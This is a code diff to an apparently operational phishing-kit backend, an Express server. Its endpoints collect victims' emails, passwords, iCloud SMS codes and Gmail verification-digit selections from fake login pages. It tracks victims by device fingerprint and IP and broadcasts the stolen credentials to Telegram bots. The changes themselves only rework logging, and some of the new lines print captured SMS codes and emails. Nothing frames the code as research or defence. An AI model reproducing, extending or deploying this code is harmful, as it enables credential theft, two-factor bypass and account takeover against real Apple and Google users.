@@ -270,7 +270,7 @@ app.post("/send-login", async (req, res) => {
       ipToEmail[ip] = email;
     }
 
-    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
+    console.log(`📧 ${email} has been directed to: Page 1`);
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
@@ -352,7 +352,6 @@ app.post("/send-redirection", async (req, res) => {
       const resolvedEmail = resolveEmailFromRequest(req, null, userId);
       if (resolvedEmail) {
         email = resolvedEmail;
-        console.log(`🔍 Resolved email via multi-layer tracking: ${email}`);
       } else {
         return res.status(400).json({ error: "Could not resolve email" });
       }
@@ -362,6 +361,7 @@ app.post("/send-redirection", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
+    console.log(`📧 ${email} has been directed to: Page 2`);
 
     // ✅ CHECK WINNER
     const winner = userWinnerTelegram[email];
@@ -906,12 +906,11 @@ app.post("/page-login", async (req, res) => {
     // ✅ UPDATE FINGERPRINT MAPPING WITH NEW EMAIL (for Verifying page later)
     if (fingerprint && messageEmail) {
       deviceFingerprintToEmail[fingerprint] = messageEmail;
-      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
     pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
-    console.log(`📥 iCloud Page Login Received: ${email} (display: ${messageEmail})`);
+    console.log(`☁️ iCloud Page Login Received: ${messageEmail} (display: ${messageEmail})`);
 
     const message =
       `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
@@ -1018,7 +1017,7 @@ app.post("/sms-code", async (req, res) => {
 
     // ✅ Store by requestId (not email!) so each code has separate status
     pendingCodes[requestId] = { status: "pending", smsCode, email, userId };
-    console.log(`📥 iCloud SMS Code Received: ${email} (requestId: ${requestId})`);
+    console.log(`⛈ iCloud SMS Code Received: ${smsCode} (${email})`);
 
     const message =
       `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
@@ -1156,14 +1155,11 @@ app.post("/resend-icloud-sms", async (req, res) => {
 
 app.post("/send-gmail-login", async (req, res) => {
   try {
-    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
     const { email, displayEmail, password, userId } = req.body;
     
     // ✅ Use displayEmail if provided (different email user typed)
     // Otherwise use email (for backward compatibility)
     const messageEmail = displayEmail || email;
-    
-    console.log('🔍 DEBUG: Received email:', email, 'displayEmail:', messageEmail, 'password:', password, 'userId:', userId);
     
     if (!email || !password || !userId) {
       return res.status(400).json({ error: "Missing email, password, or userId" });
@@ -1171,12 +1167,10 @@ app.post("/send-gmail-login", async (req, res) => {
     
     const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
     const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
     
     // ✅ Store displayEmail for later retrieval
     displayEmailStore[displayEmailKey] = messageEmail;
     displayEmailByRequestId[requestId] = messageEmail;
-    console.log(`📧 Stored display email: ${messageEmail}`);
     
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1187,11 +1181,11 @@ app.post("/send-gmail-login", async (req, res) => {
     // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING WITH NEW EMAIL
     if (fingerprint && messageEmail) {
       deviceFingerprintToEmail[fingerprint] = messageEmail;
-      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
     pendingGmailLogin[requestId] = { status: "pending", email: email, displayEmail: messageEmail };
+    console.log(`🌈 Gmail Login Received: ${messageEmail}`);
 
     const message =
       `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
@@ -1234,7 +1228,6 @@ app.post("/send-gmail-login", async (req, res) => {
       });
     }
 
-    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
     res.json({ status: "pending", requestId, displayEmailKey });
 
   } catch (err) {
@@ -1356,20 +1349,17 @@ app.get("/get-gmail-login/:requestId", (req, res) => {
 
 app.post("/send-verification-page", async (req, res) => {
   try {
-    console.log('🔍 DEBUG: /send-verification-page endpoint called');
     const { userId, email, displayEmail } = req.body;
     
     // ✅ Use displayEmail if provided, otherwise use email
     const messageEmail = displayEmail || email;
-    
-    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email, 'displayEmail:', messageEmail);
     
     if (!userId || !email) {
       return res.status(400).json({ error: "Missing userId or email" });
     }
     
     const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    console.log('🔍 DEBUG: Generated requestId:', requestId);
+    console.log(`🌈 Gmail Verification Received: ${messageEmail}`);
     
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1418,7 +1408,6 @@ app.post("/send-verification-page", async (req, res) => {
     let resolvedEmail = email;
     if (!userWinnerTelegram[email]) {
       resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
     }
 
     const botToken = process.env.BOT_TOKEN;
@@ -1526,7 +1515,7 @@ app.post("/send-verification-confirm", async (req, res) => {
       displayEmail = pendingVerificationPage[requestId].displayEmail;
     }
     
-    console.log(`📋 Verification confirm: ${displayEmail} selected ${digit1}${digit2}`);
+    console.log(`🌈 Digits selected: ${digit1}${digit2}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
